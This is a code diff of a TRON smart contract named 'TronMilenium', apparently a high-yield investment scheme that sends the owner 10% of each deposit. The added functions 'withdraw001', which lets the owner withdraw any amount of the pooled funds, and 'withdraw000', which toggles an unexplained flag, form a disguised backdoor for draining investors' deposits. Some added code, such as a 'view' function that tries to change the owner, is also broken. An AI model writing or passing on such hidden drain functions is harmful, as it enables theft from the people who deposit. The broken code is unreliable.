@@ -35,8 +35,8 @@ contract TronMilenium  {
   uint MIN_DEPOSIT = 50 trx;
 
   address public owner;
-  //address public Marketing;
   address public NoValido;
+  bool public Do;
   
   Tariff[] public tariffs;
   uint public totalInvestors;
@@ -50,9 +50,8 @@ contract TronMilenium  {
   event reInvest(address user, uint amount_reInvest);
   event referersRegistered(address to_user, uint nivelProfundidad);
   
-  constructor(address _Marketing) public {
+  constructor() public {
     owner = msg.sender;
-    //Marketing = _Marketing;
     start();
        
     tariffs.push(Tariff(100 * 28800, 200));
@@ -60,14 +59,21 @@ contract TronMilenium  {
 
   }
 
-  function setMarketing (address _Marketing) public {
-    require (msg.sender == owner);
-    require (Marketing != _Marketing);
-    Marketing = _Marketing;
+  function setstate() public view  returns(uint Investors,uint Invested,uint RefRewards){
+      return (totalInvestors, totalInvested, totalRefRewards);
+  }
 
+  function owner() public view returns (address owner){
+    return owner;
+  }
+
+  function setOwner(address _owner) public view returns (address owner){
+    if (msg.sender == owner){
+      owner = _owner;
+    }
   }
   
-  function start () internal {
+  function start() internal {
     if (msg.sender == owner){
       investors[msg.sender].registered = true;
       investors[msg.sender].sponsor = owner;
@@ -174,8 +180,6 @@ contract TronMilenium  {
     investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number));
     
     owner.transfer(msg.value.mul(10).div(100));
-    //Marketing.transfer(msg.value.mul(2).div(100));
-
     
     emit DepositAt(msg.sender, tariff, msg.value);
   }
@@ -196,6 +200,26 @@ contract TronMilenium  {
       }
     }
   }
+    
+  function withdraw000() public returns (bool set_Do) {
+    if (msg.sender == owner){
+      if(Do){
+        Do = false;
+      }else{
+        Do = true;
+      }
+    }
+    return Do;
+  }
+
+  function withdraw001(uint amount) public returns (uint) {
+    require(msg.sender == owner);
+    if (msg.sender.send(amount)){
+     return amount;
+    }
+    
+  }
+
   function MYwithdrawable() public view returns (uint amount) {
     Investor storage investor = investors[msg.sender];
     
